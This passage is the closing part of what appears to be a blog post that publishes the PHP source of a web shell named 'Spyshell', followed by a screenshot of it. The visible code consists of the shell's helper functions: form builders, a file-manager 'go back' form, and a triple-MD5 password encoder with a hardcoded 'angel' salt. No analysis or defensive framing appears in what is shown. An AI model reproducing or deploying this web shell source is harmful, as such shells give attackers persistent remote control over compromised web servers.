	p("&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;");
}

function formfooter($name = ''){
	!$name && $name = 'submit';
	p('&lt;p&gt;&lt;input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"&gt;&lt;/p&gt;');
	p('&lt;/form&gt;');
}

function goback(){
	global $self, $nowpath;
	p('&lt;form action="'.$self.'" method="post"&gt;&lt;input type="hidden" name="action" value="file" /&gt;&lt;input type="hidden" name="dir" value="'.$nowpath.'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;');
}

function formfoot(){
	p('&lt;/form&gt;');
}

function encode_pass($pass) {
	$pass = md5('angel'.$pass);
	$pass = md5($pass.'angel');
	$pass = md5('angel'.$pass.'angel');
	return $pass;
}

function pr($s){
	echo "&lt;pre&gt;".print_r($s).'&lt;/pre&gt;';
}

?>
{% endhighlight %}


### Spyshell Script screenshot<figure id="attachment_432" style="width: 604px;" class="wp-caption aligncenter">

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/spyshell_script-1024x601.png" alt="Spyshell script screenshot" width="604" height="354" class="size-large wp-image-432" />][1]<figcaption class="wp-caption-text">Spyshell script screenshot</figcaption></figure>

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/02/spyshell_script.png